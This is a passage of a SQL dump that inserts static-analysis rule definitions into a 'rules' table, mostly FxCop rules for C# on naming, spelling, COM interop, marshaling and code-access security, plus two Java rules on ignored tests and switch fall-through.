INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (536, 'CA2204: Literals should be spelled correctly', 'LiteralsShouldBeSpelledCorrectly', 'CA2204', 'fxcop', '<h2>Cause</h2>
<p>
            A method passes a literal string to that is used in a parameter or property that requires a localized string and the literal string contains one or more words that are not recognized by the Microsoft spelling checker library.
</p>
<h2>Rule Description</h2>
<p>
            This rule checks a literal string that is passed as a value to a parameter or property when one or more of the following cases is true:
            <ul>
              <li>
                The <code>LocalizableAttribute</code> attribute of the parameter or property is set to true.
              </li>
              <li>
                The parameter or property name contains "Text", "Message", or "Caption".
              </li>
              <li>
                The name of the string parameter that is passed to a Console.Write or Console.WriteLine method is either "value" or "format".
              </li>
            </ul>
            This rule parses the literal string into words, tokenizing compound words, and checks the spelling of each word/token. For information about the parsing algorithm, see CA1704: Identifiers should be spelled correctly.
            By default, the English (en) version of the spelling checker is used.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, correct the spelling of the word or add the word to a custom dictionary. For information about how to use custom dictionaries, see How to: Customize the Code Analysis Dictionary.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Correctly spelled words reduce the learning curve required for new software libraries.
</p>
<h2>Related Rules</h2>
<p>


                CA1704: Identifiers should be spelled correctly




                CA1703: Resource strings should be spelled correctly


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264488.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264488.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '2min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812460, 1510817812461, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (537, 'CA1717: Only FlagsAttribute enums should have plural names', 'OnlyFlagsEnumsShouldHavePluralNames', 'CA1717', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an externally visible enumeration ends in a plural word and the enumeration is not marked with the <code>System.FlagsAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            Naming conventions dictate that a plural name for an enumeration indicates that more than one value of the enumeration can be specified simultaneously. The <code>FlagsAttribute</code> tells compilers that the enumeration should be treated as a bit field that enables bitwise operations on the enumeration.
            If only one value of an enumeration can be specified at a time, the name of the enumeration should be a singular word. For example, an enumeration that defines the days of the week might be intended for use in an application where you can specify multiple days. This enumeration should have the <code>FlagsAttribute</code> and could be called ''Days''. A similar enumeration that allows only a single day to be specified would not have the attribute, and could be called ''Day''.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Make the name of the enumeration a singular word or add the <code>FlagsAttribute</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from the rule if the name ends in a singular word.
</p>
<h2>Related Rules</h2>
<p>


                CA1714: Flags enums should have plural names




                {rule:fxcop:MarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotMarkEnumsWithFlags}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264487.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264487.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812461, 1510817812462, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (630, 'CA1600: Do not use idle process priority', 'DoNotUseIdleProcessPriority', 'CA1600', 'fxcop', '<h2>Cause</h2>
<p>
            This rule occurs when processes are set to <code>ProcessPriorityClass.Idle</code>.
</p>
<h2>Rule Description</h2>
<p>
            Do not set process priority to Idle. Processes that have <code>System.Diagnostics.ProcessPriorityClass.Idle</code> will occupy the CPU when it would otherwise be idle, and will therefore block standby.
</p>
<h2>How to Fix Violations</h2>
<p>
            Set processes to <code>ProcessPriorityClass.BelowNormal</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            This rule should be suppressed only when Idle process priority is required and mobility considerations can be ignored safely.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182219.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182219.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812587, 1510817812587, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (538, 'CA2102: Catch non-CLSCompliant exceptions in general handlers', 'CatchNonClsCompliantExceptionsInGeneralHandlers', 'CA2102', 'fxcop', '<h2>Cause</h2>
<p>
            A member in an assembly that is not marked with the <code>RuntimeCompatibilityAttribute</code> or is marked RuntimeCompatibility(WrapNonExceptionThrows = false) contains a catch block that handles <code>System.Exception</code> and does not contain an immediately following general catch block. This rule ignores Visual Basic assemblies.
</p>
<h2>Rule Description</h2>
<p>
            A catch block that handles <code>Exception</code> catches all Common Language Specification (CLS) compliant exceptions. However, it does not catch non-CLS compliant exceptions. Non-CLS compliant exceptions can be thrown from native code or from managed code that was generated by the Microsoft intermediate language (MSIL) Assembler. Notice that the C# and Visual Basic compilers do not allow non-CLS compliant exceptions to be thrown and Visual Basic does not catch non-CLS compliant exceptions. If the intent of the catch block is to handle all exceptions, use the following general catch block syntax.
            <ul>
              <li>
                C#: catch {}
              </li>
              <li>
                C++: catch(...) {} or catch(Object^) {}
              </li>
            </ul>
            An unhandled non-CLS compliant exception becomes a security issue when previously allowed permissions are removed in the catch block. Because non-CLS compliant exceptions are not caught, a malicious method that throws a non-CLS compliant exception could run with elevated permissions.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule when the intent is to catch all exceptions, substitute or add a general catch block or mark the assembly RuntimeCompatibility(WrapNonExceptionThrows = true). If permissions are removed in the catch block, duplicate the functionality in the general catch block. If it is not the intent to handle all exceptions, replace the catch block that handles <code>Exception</code> with catch blocks that handle specific exception types.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the try block does not contain any statements that might generate a non-CLS compliant exception. Because any native or managed code might throw a non-CLS compliant exception, this requires knowledge of all code that can be executed in all code paths inside the try block. Notice that non-CLS compliant exceptions are not thrown by the common language runtime.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DoNotCatchGeneralExceptionTypes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264489.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264489.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812462, 1510817812463, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (539, 'CA2142: Transparent code should not be protected with LinkDemands', 'TransparentMethodsShouldNotBeProtectedWithLinkDemands', 'CA2142', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent method requires a <code>LinkDemand</code> or other security demand.
</p>
<h2>Rule Description</h2>
<p>
            This rule fires on transparent methods which require LinkDemands to access them. Security transparent code should not be responsible for verifying the security of an operation, and therefore should not demand permissions. Because transparent methods are supposed to be security neutral, they should not be making any security decisions. Additionally, safe critical code, which does make security decisions, should not be relying on transparent code to have previously made such a decision.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the link demand on the transparent method or mark the method with <code>SecuritySafeCriticalAttribute</code> attribute if it is performing security checks, such as security demands.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997567.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997567.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812464, 1510817812464, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (540, 'CA2114: Method security should be a superset of type', 'MethodSecurityShouldBeASupersetOfType', 'CA2114', 'fxcop', '<h2>Cause</h2>
<p>
            A type has declarative security and one of its methods has declarative security for the same security action, and the security action is not Link Demands or Inheritance Demands, and the permissions checked by the type are not a subset of the permissions checked by the method.
</p>
<h2>Rule Description</h2>
<p>
            A method should not have both a method-level and type-level declarative security for the same action. The two checks are not combined; only the method-level demand is applied. For example, if a type demands permission X, and one of its methods demands permission Y, code does not have to have permission X to execute the method.
</p>
<h2>How to Fix Violations</h2>
<p>
            Review your code to make sure that both actions are required. If both actions are required, make sure that the method-level action includes the security specified at the type level. For example, if your type demands permission X, and its method must also demand permission Y, the method should explicitly demand X and Y.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the method does not require the security specified by the type. However, this is not an ordinary scenario and might indicate a need for a careful design review.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182304.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182304.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812465, 1510817812465, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (541, 'CA1405: COM visible type base types should be COM visible', 'ComVisibleTypeBaseTypesShouldBeComVisible', 'CA1405', 'fxcop', '<h2>Cause</h2>
<p>
            A Component Object Model (COM) visible type derives from a type that is not COM visible.
</p>
<h2>Rule Description</h2>
<p>
            When a COM visible type adds members in a new version, it must abide by strict guidelines to avoid breaking COM clients that bind to the current version. A type that is invisible to COM presumes it does not have to follow these COM versioning rules when it adds new members. However, if a COM visible type derives from the COM invisible type and exposes a class interface of <code>ClassInterfaceType.AutoDual</code> or <code>AutoDispatch</code> (the default), all public members of the base type (unless they are specifically marked as COM invisible, which would be redundant) are exposed to COM. If the base type adds new members in a subsequent version, any COM clients that bind to the class interface of the derived type might break. COM visible types should derive only from COM visible types to reduce the chance of breaking COM clients.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, make the base types COM visible or the derived type COM invisible.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182202.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182202.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812466, 1510817812467, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (542, 'CA1713: Events should not have before or after prefix', 'EventsShouldNotHaveBeforeOrAfterPrefix', 'CA1713', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an event starts with ''Before'' or ''After''.
</p>
<h2>Rule Description</h2>
<p>
            Event names should describe the action that raises the event. To name related events that are raised in a specific sequence, use the present or past tense to indicate the relative position in the sequence of actions. For example, when naming a pair of events that is raised when closing a resource, you might name it ''Closing'' and ''Closed'', instead of ''BeforeClose'' and ''AfterClose''.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
</p>
<h2>How to Fix Violations</h2>
<p>
            Remove the prefix from the event name, and consider changing the name to use the present or past tense of a verb.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182238.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182238.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812471, 1510817812471, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (543, 'CA1703: Resource strings should be spelled correctly', 'ResourceStringsShouldBeSpelledCorrectly', 'CA1703', 'fxcop', '<h2>Cause</h2>
<p>
            A resource string contains one or more words that are not recognized by the Microsoft spelling checker library.
</p>
<h2>Rule Description</h2>
<p>
            This rule parses the resource string into words (tokenizing compound words) and checks the spelling of each word/token. For information about the parsing algorithm, see CA1704: Identifiers should be spelled correctly.
            By default, the English (en) version of the spelling checker is used.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, use complete words that are correctly spelled or add the words to a custom dictionary. For information about how to use custom dictionaries, see CA1704: Identifiers should be spelled correctly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Correctly spelled words reduce the time that is required to learn new software libraries.
</p>
<h2>Related Rules</h2>
<p>


                CA1701: Resource string compound words should be cased correctly




                CA1704: Identifiers should be spelled correctly




                CA2204: Literals should be spelled correctly


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb264483.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264483.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812472, 1510817812473, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (544, 'CA1047: Do not declare protected members in sealed types', 'DoNotDeclareProtectedMembersInSealedTypes', 'CA1047', 'fxcop', '<h2>Cause</h2>
<p>
            A public type is <code>sealed</code> (<code>NotInheritable</code> in Visual basic) and declares a protected member or a protected nested type. This rule does not report violations for <code>Finalize</code> methods, which must follow this pattern.
</p>
<h2>Rule Description</h2>
<p>
            Types declare protected members so that inheriting types can access or override the member. By definition, you cannot inherit from a sealed type, which means that protected methods on sealed types cannot be called.
            The C# compiler issues a warning for this error.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the access level of the member to private, or make the type inheritable.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Leaving the type in its current state can cause maintenance issues and does not provide any benefits.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182138.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182138.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812473, 1510817812474, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (782, 'Tests should not be ignored', 'S1607', NULL, 'squid', '<p>When a test fails due, for example, to infrastructure issues, you might want to ignore it temporarily. But without some kind of notation about why
the test is being ignored, it may never be reactivated. Such tests are difficult to address without comprehensive knowledge of the project, and end up
polluting their projects.</p>
<p>This rule raises an issue for each ignored test that does not have a notation about why it is being skipped.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Ignore  // Noncompliant
@Test
public void testDoTheThing() {
  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testDoTheThing() {
  // ...
</pre>
<h2>Exceptions</h2>
<p>The rule doesn''t raise an issue if there is a comment in the @Ignore annotation</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'suspicious,tests', false, 'HTML', 1510817812793, 1510817812794, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (783, 'Switch cases should end with an unconditional "break" statement', 'S128', NULL, 'squid', '<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both ''doSomething()'' and ''doSomethingElse()'' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw new IllegalStateException();
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZoFLAQ">CERT, MSC18-CPP.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ewHAAQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe,misra,suspicious', false, 'HTML', 1510817812794, 1510817812795, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (545, 'CA1725: Parameter names should match base declaration', 'ParameterNamesShouldMatchBaseDeclaration', 'CA1725', 'fxcop', '<h2>Cause</h2>
<p>
            The name of a parameter in an externally visible method override does not match the name of the parameter in the base declaration of the method, or the name of the parameter in the interface declaration of the method.
</p>
<h2>Rule Description</h2>
<p>
            Consistent naming of parameters in an override hierarchy increases the usability of the method overrides. A parameter name in a derived method that differs from the name in the base declaration can cause confusion about whether the method is an override of the base method or a new overload of the method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, rename the parameter to match the base declaration. The fix is a breaking change for COM visible methods.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule except for COM visible methods in libraries that have previously shipped.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182251.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182251.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812474, 1510817812475, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (546, 'CA1414: Mark boolean P/Invoke arguments with MarshalAs', 'MarkBooleanPInvokeArgumentsWithMarshalAs', 'CA1414', 'fxcop', '<h2>Cause</h2>
<p>
            A platform invoke method declaration includes a <code>System.Boolean</code> parameter or return value but the <code>System.Runtime.InteropServices.MarshalAsAttribute</code> attribute is not applied to the parameter or return value.
</p>
<h2>Rule Description</h2>
<p>
            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code>. <code>MarshalAsAttribute</code> specifies the marshaling behavior that is used to convert data types between managed and unmanaged code. Many simple data types, such as <code>System.Byte</code> and System.Int32, have a single representation in unmanaged code and do not require specification of their marshaling behavior; the common language runtime automatically supplies the correct behavior.
            The <code>Boolean</code> data type has multiple representations in unmanaged code. When the <code>MarshalAsAttribute</code> is not specified, the default marshaling behavior for the <code>Boolean</code> data type is <code>UnmanagedType.Bool</code>. This is a 32-bit integer, which is not appropriate in all circumstances. The Boolean representation that is required by the unmanaged method should be determined and matched to the appropriate <code>System.Runtime.InteropServices.UnmanagedType</code>. UnmanagedType.Bool is the Win32 BOOL type, which is always 4 bytes. UnmanagedType.U1 should be used for C++ bool or other 1-byte types. For more information, see Default Marshaling for Boolean Types.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, apply <code>MarshalAsAttribute</code> to the <code>Boolean</code> parameter or return value. Set the value of the attribute to the appropriate <code>UnmanagedType</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Even if the default marshaling behavior is appropriate, the code is more easily maintained when the behavior is explicitly specified.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:PInvokeDeclarationsShouldBePortable}<br/>




                {rule:fxcop:SpecifyMarshalingForPInvokeStringArguments}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182206.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182206.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812476, 1510817812476, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (547, 'CA2208: Instantiate argument exceptions correctly', 'InstantiateArgumentExceptionsCorrectly', 'CA2208', 'fxcop', '<h2>Cause</h2>
<p>
            Possible causes include the following situations:
            <ul>
              <li>
                A call is made to the default (parameterless) constructor of an exception type that is, or derives from [System.ArgumentException].
              </li>
              <li>
                An incorrect string argument is passed to a parameterized constructor of an exception type that is, or derives from [System.ArgumentException.]
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            Instead of calling the default constructor, call one of the constructor overloads that allows a more meaningful exception message to be provided. The exception message should target the developer and clearly explain the error condition and how to correct or avoid the exception.
            The signatures of the one and two string constructors of <code>ArgumentException</code> and its derived types are not consistent with respect to the message and paramName parameters. Make sure these constructors are called with the correct string arguments. The signatures are as follows:


                <code>ArgumentException</code>
              (string message)


                <code>ArgumentException</code>
              (string message, string paramName)


                <code>ArgumentNullException</code>
              (string paramName)


                <code>ArgumentNullException</code>
              (string paramName, string message)


                <code>ArgumentOutOfRangeException</code>
              (string paramName)


                <code>ArgumentOutOfRangeException</code>
              (string paramName, string message)


                <code>DuplicateWaitObjectException</code>
              (string parameterName)


                <code>DuplicateWaitObjectException</code>
              (string parameterName, string message)
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call a constructor that takes a message, a parameter name, or both, and make sure the arguments are proper for the type of <code>ArgumentException</code> being called.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule only if a parameterized constructor is called with the correct string arguments.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182347.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182347.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812477, 1510817812478, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (548, 'CA1012: Abstract types should not have constructors', 'AbstractTypesShouldNotHaveConstructors', 'CA1012', 'fxcop', '<h2>Cause</h2>
<p>
            A public type is abstract and has a public constructor.
</p>
<h2>Rule Description</h2>
<p>
            Constructors on abstract types can be called only by derived types. Because public constructors create instances of a type, and you cannot create instances of an abstract type, an abstract type that has a public constructor is incorrectly designed.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, either make the constructor protected or do not declare the type as abstract.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. The abstract type has a public constructor.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182126.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182126.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812478, 1510817812479, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (549, 'CA2126: Type link demands require inheritance demands', 'TypeLinkDemandsRequireInheritanceDemands', 'CA2126', 'fxcop', '<h2>Cause</h2>
<p>
            A public unsealed type is protected with a link demand, has an overridable method, and neither the type nor the method is protected with an inheritance demand.
</p>
<h2>Rule Description</h2>
<p>
            A link demand on a method or its declaring type requires the immediate caller of the method to have the specified permission. An inheritance demand on a method requires an overriding method to have the specified permission. An inheritance demand on a type requires a deriving class to have the specified permission.
</p>
<h2>How to Fix Violations</h2>
